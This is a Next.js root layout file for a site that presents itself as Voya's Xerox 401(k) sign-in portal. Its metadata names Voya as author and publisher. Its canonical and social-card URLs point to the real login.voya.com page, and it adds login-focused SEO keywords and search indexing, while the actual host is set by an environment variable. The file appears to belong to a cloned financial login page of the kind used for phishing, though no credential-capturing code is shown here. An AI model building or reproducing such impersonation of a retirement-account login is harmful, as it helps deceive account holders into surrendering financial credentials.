import type React from "react";
import type { Metadata, Viewport } from "next";
import { Geist } from "next/font/google";
import { Analytics } from "@vercel/analytics/next";
import "./globals.css";

const geist = Geist({ subsets: ["latin"] });

const CANONICAL_LOGIN_URL =
  "https://login.voya.com/voyassoui/index.html?domain=xerox401k.voya.com#/login-pweb";
const SITE_DOMAIN = "login.voya.com";
const SITE_BRAND = "Voya";

export const metadata: Metadata = {
  metadataBase: new URL(
    process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
  ),
  title: {
    default: "Voya - 401(k) Login",
    template: "%s | Voya",
  },
  keywords: [
    "Voya",
    "Xerox 401(k)",
    "401(k) login",
    "retirement plan",
    "employee retirement",
    "401k account access",
    "retirement savings",
    "investment portfolio",
    "retirement benefits",
    "secure login",
    "participant portal",
    "employer portal",
    "401k contributions",
    "retirement account",
    "voya.com",
    "xerox benefits",
  ],
  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your Xerox 401(k) retirement plan account, manage your investments, and sign in securely through Voya.`,

  authors: [{ name: "Voya" }],
  creator: "Voya",
  publisher: "Voya",
  applicationName: SITE_BRAND,
  referrer: "origin-when-cross-origin",
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  openGraph: {
    type: "website",
    locale: "en_US",
    title: "Voya - 401(k) Login",
    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your Xerox 401(k) retirement plan account, manage your investments, and sign in securely through Voya.`,
    siteName: SITE_BRAND,
    url: CANONICAL_LOGIN_URL,
    images: [
      {
        url: "/favicon-32x32.png",
        width: 32,
        height: 32,
        alt: `${SITE_BRAND}`,
      },
    ],
  },
  twitter: {
    card: "summary",
    title: "Voya - 401(k) Login",
    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your Xerox 401(k) retirement plan account, manage your investments, and sign in securely through Voya.`,
    images: ["/favicon-32x32.png"],
  },
  icons: {
    icon: "/favicon-32x32.png",
    shortcut: "/favicon-32x32.png",
    apple: "/favicon-32x32.png",
  },
  category: "Business",
  alternates: {
    canonical: CANONICAL_LOGIN_URL,
    languages: {
      "en-US": CANONICAL_LOGIN_URL,
    },
  },
  other: {
    "geo.region": "US",
  },
};

export const viewport: Viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 5,
  themeColor: "#254650",
};

const jsonLd = {
  "@context": "https://schema.org",
  "@type": "WebSite",
  name: SITE_BRAND,
  url: CANONICAL_LOGIN_URL,
  description:
    "Voya sign in portal. Login to manage your Xerox 401(k) retirement plan, view your investments, and access your Voya account.",
  publisher: {
    "@type": "Organization",
    name: "Voya",
  },
  inLanguage: "en-US",
  potentialAction: {
    "@type": "SearchAction",
    target: { "@type": "EntryPoint", url: CANONICAL_LOGIN_URL },
    "query-input": "required name=search_term_string",
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en-US">
      <head>
        <link
          href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap"
          rel="stylesheet"
        />
      </head>
      <body className={`${geist.className} font-sans antialiased`}>
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
        />
        {children}
        <Analytics />
      </body>
    </html>
  );
}
